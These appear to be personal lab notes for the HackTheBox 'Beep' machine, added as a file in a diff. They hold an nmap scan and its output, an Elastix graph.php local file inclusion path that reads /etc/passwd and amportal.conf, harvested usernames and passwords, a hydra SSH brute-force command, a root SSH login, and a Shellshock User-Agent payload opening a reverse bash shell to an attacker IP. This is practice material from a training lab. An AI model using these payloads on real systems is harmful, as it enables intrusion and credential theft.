@@ -1,0 +1,144 @@
+https://medium.com/@siddharth.singhal1995/hackthebox-walkthrough-beep-5-60e29ad0668a
+https://thehacktoday.com/hack-the-box-beep-walkthrough/
+
+ping 10.129.78.96
+
+export ip=10.129.78.96
+
+printenv
+
+sudo nmap -sV -O -T4 -A -sC -p- $ip -oA nmap
+
+http://10.129.78.96 -> https://10.129.78.96
+
+To Get the banner grabbing:- 
+telnet $ip 80
+telnet $ip 443
+
+searchsploit Elastix
+Elastix 2.2.0 - 'graph.php' Local File Inclusion 
+#LFI Exploit: 
+/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
+/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action
+
+
+valid user:
+asteriskuser
+admin
+root
+adm
+halt
+operator
+gopher
+cyrus
+asterisk
+User
+nfsnobody
+fanis
+
+password:
+jEhdIekWmdjE
+passw0rd
+amp111
+amp109
+
+hydra -L beepuser -P beeppasswd ssh://10.129.78.96
+
+While Trying in kali:
+no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
+solution:-> ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 root@10.129.78.96
+
+
+ssh root@10.129.78.96
+pass:- jEhdIekWmdjE
+
+------- Method 2 -----------------------------
+Port 10000 is open i.e Webmin
+telnet 10.129.78.96 10000
+
+since: https://10.129.78.96:10000/session_login.cgi
+server is using cgi file so we can try for shellshock 
+
+http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+using burp: User-Agent: () { :;}; echo; /bin/bash -i >& /dev/tcp/10.10.14.11/4444 0>&1
+
+nc -nlvp 4444
+
+
+------------- NMAP ------------------
+Nmap scan report for 10.129.78.96
+Host is up (0.17s latency).
+Not shown: 65512 closed ports
+PORT      STATE    SERVICE    VERSION
+22/tcp    open     ssh        OpenSSH 4.3 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
+|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
+25/tcp    open     smtp?
+|_smtp-commands: Couldn't establish connection on port 25
+80/tcp    open     http       Apache httpd 2.2.3
+|_http-server-header: Apache/2.2.3 (CentOS)
+|_http-title: Did not follow redirect to https://10.129.78.96/
+110/tcp   open     pop3?
+111/tcp   open     rpcbind    2 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2            111/tcp   rpcbind
+|   100000  2            111/udp   rpcbind
+|   100024  1            939/udp   status
+|_  100024  1            942/tcp   status
+143/tcp   open     imap?
+443/tcp   open     ssl/https?
+| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
+| Not valid before: 2017-04-07T08:22:08
+|_Not valid after:  2018-04-07T08:22:08
+|_ssl-date: 2021-01-10T15:14:05+00:00; +1h02m55s from scanner time.
+942/tcp   open     status     1 (RPC #100024)
+993/tcp   open     imaps?
+995/tcp   open     pop3s?
+3042/tcp  filtered journee
+3306/tcp  open     mysql?
+|_mysql-info: ERROR: Script execution failed (use -d to debug)
+|_ssl-date: ERROR: Script execution failed (use -d to debug)
+|_tls-alpn: ERROR: Script execution failed (use -d to debug)
+|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
+3506/tcp  filtered apc-3506
+4190/tcp  open     sieve?
+4445/tcp  open     upnotifyp?
+4559/tcp  open     hylafax?
+5038/tcp  open     asterisk   Asterisk Call Manager 1.1
+8782/tcp  filtered unknown
+10000/tcp open     http       MiniServ 1.570 (Webmin httpd)
+|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
+36159/tcp filtered unknown
+37692/tcp filtered unknown
+37844/tcp filtered unknown
+57583/tcp filtered unknown
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.91%E=4%D=1/10%OT=22%CT=1%CU=43456%PV=Y%DS=2%DC=T%G=Y%TM=5FFB0C9
+OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=C4%GCD=1%ISR=CB%TI=Z%CI=Z%TS=3)SEQ(SP=C5%
+OS:GCD=1%ISR=CB%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M5
+OS:4DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=16A0%W2=16A0
+OS:%W3=16A0%W4=16A0%W5=16A0%W6=16A0)ECN(R=Y%DF=Y%T=40%W=16D0%O=M54DNNSNW7%C
+OS:C=N%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=
+OS:16A0%S=O%A=S+%F=AS%O=M54DST11NW7%RD=0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
+OS:R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T
+OS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=
+OS:0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(
+OS:R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 2 hops
+Service Info: Host: 127.0.0.1
+
+Host script results:
+|_clock-skew: 1h02m54s
+
+TRACEROUTE (using port 1025/tcp)
+HOP RTT       ADDRESS
+1   155.98 ms 10.10.14.1
+2   172.30 ms 10.129.78.96
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1738.46 seconds
